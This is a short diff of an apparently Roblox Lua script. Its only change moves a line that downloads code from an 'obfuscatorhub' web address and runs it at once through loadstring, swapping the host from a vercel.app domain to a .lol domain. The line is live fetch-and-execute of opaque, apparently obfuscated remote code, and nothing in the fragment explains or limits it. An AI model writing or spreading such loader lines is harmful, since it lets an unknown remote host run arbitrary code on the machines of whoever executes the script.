@@ -130,4 +130,4 @@ end
 
 createNotification()
 
-loadstring(game:HttpGet("https://obfuscatorhub.vercel.app/api/S6FsKMS8"))()
+loadstring(game:HttpGet("https://obfuscatorhub.lol/api/S6FsKMS8"))()
